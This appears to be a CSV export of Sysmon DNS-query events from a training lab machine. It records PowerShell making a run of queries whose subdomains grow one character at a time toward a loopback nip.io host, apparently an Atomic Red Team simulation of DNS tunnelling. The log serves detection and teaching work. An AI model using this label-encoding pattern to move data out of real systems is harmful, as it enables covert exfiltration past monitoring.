"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166414,"Query: 084.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.947","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166415,"Query: 085.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:24.990","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166416,"Query: 086.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.033","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166417,"Query: 087.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.078","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166418,"Query: 088.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.121","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166419,"Query: 089.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.164","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166420,"Query: 090.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.206","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166421,"Query: 091.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.251","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:25.345 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166422,"Query: 092.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.290","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166423,"Query: 093.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.331","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166424,"Query: 094.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.373","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166425,"Query: 095.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.547","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166426,"Query: 096.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.593","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166427,"Query: 097.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.774","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166428,"Query: 098.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.943","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166429,"Query: 099.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:25.984","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166430,"Query: 100.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.025","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.349 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166431,"Query: 101.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.197","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:26.350 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166432,"Query: 102.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.245","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166433,"Query: 103.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.288","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166434,"Query: 104.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.332","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166435,"Query: 105.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.374","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166436,"Query: 106.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.417","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166437,"Query: 107.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.461","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166438,"Query: 108.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.505","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166439,"Query: 109.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.551","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166440,"Query: 110.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.593","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166441,"Query: 111.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.637","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166442,"Query: 112.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.680","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166443,"Query: 113.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.721","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166444,"Query: 114.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.762","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166445,"Query: 115.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.806","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166446,"Query: 116.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.851","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166447,"Query: 117.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:26.896","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166448,"Query: 118.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.216","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166449,"Query: 119.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.260","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:27.361 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166450,"Query: 120.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.305","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.373 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166451,"Query: 121.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.348","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.373 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166452,"Query: 122.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.389","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166453,"Query: 123.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.432","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166454,"Query: 124.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.477","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166455,"Query: 125.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.519","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166456,"Query: 126.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.563","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:28.374 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166457,"Query: 127.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:27.607","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
